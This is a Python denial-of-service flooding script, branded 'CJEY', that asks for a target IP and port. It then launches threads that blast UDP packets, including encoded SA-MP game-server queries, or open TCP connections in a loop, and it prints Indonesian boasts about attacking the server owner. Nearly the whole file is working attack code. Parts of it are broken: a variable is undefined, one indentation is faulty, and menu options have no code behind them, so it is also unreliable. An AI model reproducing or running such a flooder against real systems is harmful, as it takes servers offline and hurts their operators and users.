import random
import socket
import threading
import os
import time
import sys
import struct
import codecs

Data = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

clear = lambda: os.system("cls")
print("Cjey@Ip")
ip = str(input("╠════════>> "))
print("Cjey@Port")
port = int(input("PORT ╚═════════>> "))
clear()

print("""
                                             \u001b[37;1m╔╦╗  ╔═╗  ╔╦╗  ╦ ╦  ╔═╗  ╔╦╗
                                             \u001b[37;1m║║║  ║╣    ║   ╠═╣  ║ ║   ║║
                                             \u001b[37;1m╩ ╩  ╚═╝   ╩   ╩ ╩  ╚═╝  ═╩╝
                      \u001b[36;1m╔═══════════════════════════════════════════════════════════════════════════╗
                      ║  - - - - - - - - - Version: \u001b[37;1m1.00 Last Update 9/26/2021\u001b[36;1m - - - - - - - - -  ║
                      ║  - - - - - - - - - Discord: \u001b[37;1mCJEY\u001b[36;1m                       - - - - - - - - -  ║
                 ╔════╩═══════════════════════════════════════════════════════════════════════════╩════╗
                 ╚════╦═══════════════════════════════════════════════════════════════════════════╦════╝
               \u001b[36;1m╔══════╩══════════════╦═════════════════════╦═══════════════════════╦══════════════╩═════╗
               \u001b[36;1m║ [1] \u001b[37;1mUDP-FLOOD\u001b[36;1m       ║ [2] \u001b[37;1mTCP-FLOOD\u001b[36;1m       ║ [3] \u001b[37;1mRDP-FREEZE\u001b[36;1m        ║ [4] \u001b[37;1mHTTP-FLOOD\u001b[36;1m     ║
               ╚═════════════════════╩═════════════════════╩═══════════════════════╩════════════════════╝
""")
choice = str(input("╠═════════>>"))
print("Cjey@Bot")
times = int(input("╠═════════>>"))
print("Threads")
threads = int(input("╚═════════>>"))

def run1():
    bytes = random._urandom(1000)
    byte = random._urandom(1460)
    byt = random._urandom(2024)
    by = random._urandom(1500)
    b = random._urandom(1475)
    a = random._urandom(1180)
    c = random._urandom(1024)
    d = random._urandom(1800)
    i = random.choice(("[*]","[!]","[#]"))
    timeout =  time.time() + duration
    sent = 3000

    while True:
            if time.time() > timeout:
            break
        else:
            pass
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(bytes,addr)
                s.sendto(byte,addr)
                s.sendto(byt,addr)
                s.sendto(by,addr)
                s.sendto(b,addr)
                s.sendto(a,addr)
                s.sendto(c,addr)
                s.sendto(d,addr)
                msg = Data[random.randrange(0, 3)]
            s.sendto(bytes, (ip, int(port)))
            s.sendto(msg, (ip, int(port)))
            s.sendto(Data[5], (ip, int(port)))
            if int(port) == 7777:
                s.sendto(Data[5], (ip, int(port)))
            elif int(port) == 7792:
                s.sendto(Data[4], (ip, int(port)))
            elif int(port) == 7771:
                s.sendto(Data[6], (ip, int(port)))
            elif int(port) == 7784:
                s.sendto(Data[7], (ip, int(port)))
            sent = sent + 1
            print("CJEY MENJATUHKAN MENTAL OWNER SEBANYAK %s DI IP %s PORT %s"%(times, ip, port))

def run2():
    data = random._urandom(9024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
        except:
            s.close()

def run3():
    data = random._urandom(9024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sedang Menyerang")
        except socket.error:
            s.close()
            print("[*] Sedang Menyerang")

for y in range(threads):
    if choice == '1':
        th = threading.Thread(target = run1)
        th.start()
    elif choice == '2':
         th = threading.Thread(target = run3)
         th.start()